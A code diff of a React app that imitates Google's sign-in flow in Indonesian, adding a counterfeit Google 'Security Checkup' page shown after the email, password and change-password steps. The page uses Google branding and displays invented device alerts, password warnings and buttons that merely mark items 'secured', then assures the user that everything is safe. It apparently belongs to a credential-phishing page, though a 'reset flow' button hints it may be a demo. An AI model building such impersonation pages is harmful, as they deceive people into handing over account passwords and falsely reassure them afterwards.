@@ -54,6 +54,9 @@ export default function App() {
   const [confirmPassword, setConfirmPassword] = useState('');
   const [error, setError] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [expandedSection, setExpandedSection] = useState<string | null>(null);
+  const [showProfileDropdown, setShowProfileDropdown] = useState(false);
+  const [securedSections, setSecuredSections] = useState<string[]>([]);
 
   const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error', newDirection: number) => {
     setIsLoading(true);
@@ -101,6 +104,411 @@ export default function App() {
     setError('');
     changeStep('success', 1);
   };
+
+  if (step === 'error') {
+    const securityItems = [
+      {
+        id: 'devices',
+        title: 'Perangkat Anda',
+        subtitle: securedSections.includes('devices')
+          ? 'Selesai didiagnosis'
+          : 'Selesaikan 2 tindakan yang disarankan',
+        isWarning: !securedSections.includes('devices'),
+        icon: securedSections.includes('devices') ? (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ) : (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+          </svg>
+        ),
+        content: securedSections.includes('devices') ? (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <span>Semua perangkat Anda aman. Anda telah keluar dari sesi tidak dikenal.</span>
+          </div>
+        ) : (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
+            <div className="flex items-start gap-3">
+              <div className="w-2 h-2 rounded-full bg-green-500 mt-1.5 flex-shrink-0" />
+              <div>
+                <p className="font-medium text-[#1f1f1f]">HP Android ini (Xiaomi Redmi Note 10)</p>
+                <p className="text-xs text-gray-500">Perangkat aktif saat ini • Indonesia</p>
+              </div>
+            </div>
+            <div className="flex items-start gap-3 border-t border-gray-100 pt-3">
+              <div className="w-2 h-2 rounded-full bg-amber-500 mt-1.5 flex-shrink-0" />
+              <div>
+                <p className="font-medium text-[#1f1f1f]">Perangkat Windows tidak dikenal</p>
+                <p className="text-xs text-gray-500">Jakarta, Indonesia • Aktif 3 jam yang lalu</p>
+                <p className="text-xs text-amber-600 mt-1">Seseorang mungkin telah mengakses akun Anda.</p>
+              </div>
+            </div>
+            <div className="flex gap-2 pt-2 justify-end">
+              <button 
+                type="button"
+                onClick={() => setSecuredSections([...securedSections, 'devices'])}
+                className="px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition"
+              >
+                Ya, itu saya
+              </button>
+              <button 
+                type="button"
+                onClick={() => setSecuredSections([...securedSections, 'devices'])}
+                className="px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] hover:shadow transition"
+              >
+                Keluar dari perangkat
+              </button>
+            </div>
+          </div>
+        )
+      },
+      {
+        id: 'recovery',
+        title: 'Login & pemulihan',
+        subtitle: securedSections.includes('recovery')
+          ? 'Email pemulihan ditambahkan'
+          : 'Tambahkan email pemulihan',
+        isWarning: !securedSections.includes('recovery'),
+        icon: securedSections.includes('recovery') ? (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ) : (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+          </svg>
+        ),
+        content: securedSections.includes('recovery') ? (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <span>Email pemulihan berhasil ditambahkan dan diamankan.</span>
+          </div>
+        ) : (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
+            <p>Email pemulihan membantu Anda masuk kembali ke akun jika ada aktivitas mencurigakan atau jika Anda lupa sandi.</p>
+            <div className="flex gap-2 max-w-sm mt-2">
+              <input 
+                type="email" 
+                placeholder="Masukkan email pemulihan" 
+                className="flex-grow px-3 py-1.5 text-xs rounded border border-gray-300 focus:outline-none focus:border-[#0b57d0] bg-white"
+                defaultValue="pemulihan@gmail.com"
+              />
+              <button 
+                type="button"
+                onClick={() => setSecuredSections([...securedSections, 'recovery'])}
+                className="px-4 py-1.5 text-xs font-medium text-white bg-[#0b57d0] rounded hover:bg-[#0842a0] transition"
+              >
+                Tambahkan
+              </button>
+            </div>
+          </div>
+        )
+      },
+      {
+        id: 'passwords',
+        title: 'Sandi Anda yang tersimpan',
+        subtitle: securedSections.includes('passwords')
+          ? 'Sandi diperiksa dan aman'
+          : 'Periksa sandi Anda',
+        isWarning: !securedSections.includes('passwords'),
+        icon: securedSections.includes('passwords') ? (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ) : (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+          </svg>
+        ),
+        content: securedSections.includes('passwords') ? (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <span>Semua sandi Anda yang tersimpan telah diperbarui dan aman.</span>
+          </div>
+        ) : (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
+            <p>Terdapat 3 sandi yang lemah atau disusupi pada Pengelola Sandi Google Anda.</p>
+            <button 
+              type="button"
+              onClick={() => setSecuredSections([...securedSections, 'passwords'])}
+              className="mt-2 px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition bg-white"
+            >
+              Periksa & Perbarui Sandi
+            </button>
+          </div>
+        )
+      },
+      {
+        id: 'safebrowsing',
+        title: 'Safe Browsing',
+        subtitle: securedSections.includes('safebrowsing')
+          ? 'Safe Browsing yang Disempurnakan aktif'
+          : 'Aktifkan Safe Browsing yang Disempurnakan',
+        isWarning: !securedSections.includes('safebrowsing'),
+        icon: securedSections.includes('safebrowsing') ? (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ) : (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+          </svg>
+        ),
+        content: securedSections.includes('safebrowsing') ? (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+            <span>Safe Browsing yang Disempurnakan telah diaktifkan untuk perlindungan ekstra.</span>
+          </div>
+        ) : (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
+            <p>Dapatkan perlindungan yang lebih cepat dan proaktif terhadap situs web, unduhan, dan ekstensi yang berbahaya.</p>
+            <button 
+              type="button"
+              onClick={() => setSecuredSections([...securedSections, 'safebrowsing'])}
+              className="mt-2 px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] transition"
+            >
+              Aktifkan sekarang
+            </button>
+          </div>
+        )
+      },
+      {
+        id: 'recent',
+        title: 'Aktivitas keamanan terbaru',
+        subtitle: 'Aktivitas dari 28 hari terakhir',
+        isWarning: false,
+        icon: (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ),
+        content: (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
+            <div className="flex items-center gap-2">
+              <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
+              <p className="font-medium text-[#1f1f1f]">Masuk baru di perangkat Chrome pada Windows</p>
+            </div>
+            <p className="text-xs text-gray-500 pl-3.5">Hari ini • Indonesia</p>
+            <p className="pl-3.5 text-xs text-gray-500">Tidak ada aktivitas mencurigakan lainnya dalam 28 hari terakhir.</p>
+          </div>
+        )
+      },
+      {
+        id: 'apps',
+        title: 'Aplikasi tertaut Anda',
+        subtitle: '3 aplikasi tertaut memiliki akses ke beberapa data Akun Google Anda',
+        isWarning: false,
+        icon: (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ),
+        content: (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
+            <p>Aplikasi berikut memiliki akses sebagian ke info Akun Google Anda:</p>
+            <ul className="list-disc pl-5 text-xs space-y-1">
+              <li>WhatsApp Messenger (Akses Google Drive)</li>
+              <li>Spotify (Info profil publik)</li>
+              <li>Netflix (Info profil dasar)</li>
+            </ul>
+            <p className="text-xs text-gray-500 mt-2">Semua aplikasi telah diverifikasi dan aman.</p>
+          </div>
+        )
+      },
+      {
+        id: 'gmail_settings',
+        title: 'Setelan Gmail',
+        subtitle: '1 setelan sensitif',
+        isWarning: false,
+        icon: (
+          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+          </svg>
+        ),
+        content: (
+          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-1">
+            <p className="font-medium text-[#1f1f1f]">Penerusan email dinonaktifkan</p>
+            <p className="text-xs text-gray-500">Penerusan otomatis email masuk dinonaktifkan untuk email {email || 'user@gmail.com'}.</p>
+          </div>
+        )
+      }
+    ];
+
+    return (
+      <div className="min-h-screen bg-white sm:bg-[#f8fafd] flex flex-col font-sans text-[#1f1f1f] relative">
+        {/* Google Account Top Header */}
+        <header className="h-[64px] border-b border-[#e0e3e7] bg-white px-4 sm:px-6 flex items-center justify-between sticky top-0 z-50">
+          <div className="flex items-center select-none">
+            <span className="text-[#020307] text-[19px] font-normal tracking-tight font-sans">
+              Google
+            </span>
+          </div>
+          
+          <div className="flex items-center gap-1">
+            <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+                <line x1="12" y1="17" x2="12.01" y2="17" />
+              </svg>
+            </button>
+            <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5 fill-current">
+                <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z" />
+              </svg>
+            </button>
+            
+            {/* Profile Pic Button */}
+            <button 
+              type="button"
+              onClick={() => setShowProfileDropdown(!showProfileDropdown)}
+              className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative"
+              id="profile-avatar-btn"
+            >
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-8 h-8" fill="currentColor">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+              </svg>
+            </button>
+
+            {/* Profile Dropdown */}
+            {showProfileDropdown && (
+              <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
+                <div className="w-16 h-16 rounded-full flex items-center justify-center text-[#5f6368] mb-3">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-16 h-16" fill="currentColor">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                  </svg>
+                </div>
+                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{email || 'user@gmail.com'}</p>
+                <p className="text-xs text-gray-500 mb-4">Pengguna Google</p>
+                
+                <button
+                  type="button"
+                  onClick={() => alert('Fitur kelola akun Google Anda')}
+                  className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#3c4043] hover:bg-gray-50 transition mb-3"
+                >
+                  Kelola Akun Google Anda
+                </button>
+                
+                <button
+                  type="button"
+                  onClick={() => {
+                    setEmail('');
+                    setPassword('');
+                    setConfirmPassword('');
+                    setExpandedSection(null);
+                    setShowProfileDropdown(false);
+                    setSecuredSections([]);
+                    setStep('email');
+                  }}
+                  className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#c5221f] hover:bg-red-50 transition"
+                >
+                  Keluar / Reset Alur
+                </button>
+              </div>
+            )}
+          </div>
+        </header>
+
+        {/* Main Content Area */}
+        <main className="flex-grow flex items-start justify-center p-4 sm:p-8 overflow-y-auto">
+          <div className="w-full max-w-[620px] bg-white border border-[#e0e3e7] rounded-2xl shadow-sm p-6 sm:p-10 flex flex-col items-center my-4 sm:my-8">
+            
+            {/* Green Shield-Check Badge */}
+            <div className="w-16 h-16 rounded-full bg-[#e6f4ea] flex items-center justify-center mb-4 flex-shrink-0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[36px] h-[36px] text-[#137333]" fill="currentColor">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
+              </svg>
+            </div>
+
+            {/* Header Titles */}
+            <h1 className="text-[28px] sm:text-[32px] text-[#1f1f1f] font-normal text-center leading-tight">
+              Pemeriksaan Keamanan
+            </h1>
+            <p className="text-[#444746] text-[15px] text-center mt-2 mb-8">
+              Berikut tips untuk Anda
+            </p>
+
+            {/* Checklist items */}
+            <div className="w-full border-t border-gray-200">
+              {securityItems.map((item) => {
+                const isExpanded = expandedSection === item.id;
+                return (
+                  <div key={item.id} className="border-b border-gray-200">
+                    <button
+                      type="button"
+                      onClick={() => setExpandedSection(isExpanded ? null : item.id)}
+                      className="w-full py-4 flex items-center justify-between text-left hover:bg-gray-50/50 px-2 transition rounded"
+                    >
+                      <div className="flex items-center gap-4">
+                        {item.icon}
+                        <div>
+                          <p className="text-[15px] font-medium text-[#1f1f1f]">{item.title}</p>
+                          <p className="text-[13px] text-gray-500 mt-0.5">{item.subtitle}</p>
+                        </div>
+                      </div>
+                      <svg 
+                        fill="currentColor" 
+                        viewBox="0 0 24 24" 
+                        className={`w-5 h-5 text-[#5f6368] transition-transform duration-200 ${isExpanded ? 'rotate-180' : ''}`}
+                      >
+                        <path d="M7 10l5 5 5-5z" />
+                      </svg>
+                    </button>
+                    
+                    {/* Collapsible Content */}
+                    <AnimatePresence initial={false}>
+                      {isExpanded && (
+                        <motion.div
+                          initial={{ height: 0, opacity: 0 }}
+                          animate={{ height: 'auto', opacity: 1 }}
+                          exit={{ height: 0, opacity: 0 }}
+                          transition={{ duration: 0.2, ease: 'easeInOut' }}
+                          className="overflow-hidden"
+                        >
+                          <div className="pb-4 pt-1 pl-[48px] pr-2">
+                            {item.content}
+                          </div>
+                        </motion.div>
+                      )}
+                    </AnimatePresence>
+                  </div>
+                );
+              })}
+            </div>
+
+            {/* Centered Blue Link at bottom */}
+            <div className="mt-8 text-center">
+              <button
+                type="button"
+                onClick={() => {
+                  setEmail('');
+                  setPassword('');
+                  setConfirmPassword('');
+                  setExpandedSection(null);
+                  setSecuredSections([]);
+                  setStep('email');
+                }}
+                className="text-[#0b57d0] hover:underline text-[14px] font-medium transition"
+              >
+                Lanjutkan ke Akun Google Anda
+              </button>
+            </div>
+
+          </div>
+        </main>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-white sm:bg-[#f0f4f9] p-0 sm:p-5 flex flex-col items-center justify-between sm:justify-center font-sans tracking-wide relative">
@@ -183,7 +591,9 @@ export default function App() {
                       onClick={() => !isLoading && changeStep('email', -1)}
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                      </svg>
                       <span>{email}</span>
                       <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
@@ -196,7 +606,9 @@ export default function App() {
                       onClick={() => !isLoading && changeStep('email', -1)}
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                      </svg>
                       <span>{email}</span>
                       <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
@@ -215,7 +627,9 @@ export default function App() {
                       onClick={() => !isLoading && changeStep('email', -1)}
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                      </svg>
                       <span>{email}</span>
                       <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
